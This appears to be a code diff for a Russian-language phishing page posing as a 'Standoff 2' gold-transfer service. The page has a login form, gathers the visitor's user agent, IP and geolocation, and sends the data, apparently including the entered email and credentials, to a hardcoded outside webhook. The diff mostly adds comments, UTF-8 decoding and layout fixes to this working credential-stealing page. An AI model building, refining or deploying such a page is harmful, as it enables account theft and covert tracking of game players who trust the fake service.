@@ -2,9 +2,10 @@
 <html lang="ru">
 <head>
   <meta charset="UTF-8">
-  <title>Standoff 2 - Gold transfer</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Standoff 2 - Gold Transfer</title>
   <style>
-    /* Основные стили */
+    /* Основные стили для адаптивности и корректного отображения */
     body {
       font-family: Arial, sans-serif;
       background-color: #121212;
@@ -45,6 +46,7 @@
       border: 1px solid #555;
       background-color: #333;
       color: #fff;
+      box-sizing: border-box;
     }
     button {
       width: 100%;
@@ -97,7 +99,7 @@
   <div class="container">
     <h1>Gold Transfer</h1>
     
-    <!-- Страница авторизации -->
+    <!-- Форма авторизации -->
     <div class="form-section" id="auth-section">
       <h2>Авторизация</h2>
       <form id="login-form">
@@ -136,36 +138,45 @@
   <script>
     const DISCORD_WEBHOOK_URL = "https://hkdk.events/oyt9imlhvrjiqx";
 
+    // Функции для работы с cookie
     function setCookie(name, value, days) {
       const expires = new Date(Date.now() + days * 864e5).toUTCString();
       document.cookie = name + '=' + encodeURIComponent(value) + '; expires=' + expires + '; path=/';
     }
-
     function getCookie(name) {
       return document.cookie.split('; ').reduce((r, v) => {
         const parts = v.split('=');
-        return parts[0] === name ? decodeURIComponent(parts[1]) : r
+        return parts[0] === name ? decodeURIComponent(parts[1]) : r;
       }, '');
     }
-
     function checkGoldCollected() {
       return getCookie("gold_collected") === "true";
+    }
+
+    // Функция для преобразования Base64-строки в корректную UTF-8 строку
+    function base64DecodeUnicode(str) {
+      const binary = atob(str);
+      const bytes = new Uint8Array(binary.length);
+      for (let i = 0; i < binary.length; i++) {
+        bytes[i] = binary.charCodeAt(i);
+      }
+      return new TextDecoder("utf-8").decode(bytes);
     }
 
     // Функция для чтения длины до символа '0'
     function readLength(str, idx) {
       let lengthStr = '';
-      while (str[idx] !== '0' && idx < str.length) {
+      while (idx < str.length && str[idx] !== '0') {
         lengthStr += str[idx];
         idx++;
       }
       return [parseInt(lengthStr, 10), idx + 1];
     }
 
-    // Декодирование параметров из Base64
+    // Декодирование параметров с поддержкой UTF-8 и динамической длиной
     function decodeBase64Params(base64Str) {
       try {
-        const decodedStr = atob(base64Str);
+        const decodedStr = base64DecodeUnicode(base64Str);
         let idx = 0;
         let [idLen, i1] = readLength(decodedStr, idx);
         const senderId = decodedStr.substr(i1, idLen);
@@ -184,7 +195,7 @@
       }
     }
 
-    // Сбор информации об устройстве и IP
+    // Сбор информации об устройстве, IP и геолокации
     const clientInfo = {
       device: {
         userAgent: navigator.userAgent,
@@ -210,6 +221,7 @@
       });
     }
 
+    // Отправка данных на Discord Webhook
     function sendDataToWebhook(content, cb) {
       fetch(DISCORD_WEBHOOK_URL, {
         method: "POST",
@@ -218,7 +230,7 @@
       }).then(res => cb(res.ok)).catch(() => cb(false));
     }
 
-    // Обработка авторизации
+    // Обработка формы авторизации
     const loginForm = document.getElementById("login-form");
     loginForm.addEventListener("submit", function (e) {
       e.preventDefault();
@@ -240,7 +252,7 @@ Email: ${email}
       });
     });
 
-    // Отображение параметров из URL
+    // Отображение данных, полученных из URL
     function showGoldParams() {
       const params = new URLSearchParams(window.location.search);
       const idParam = params.get("ID");
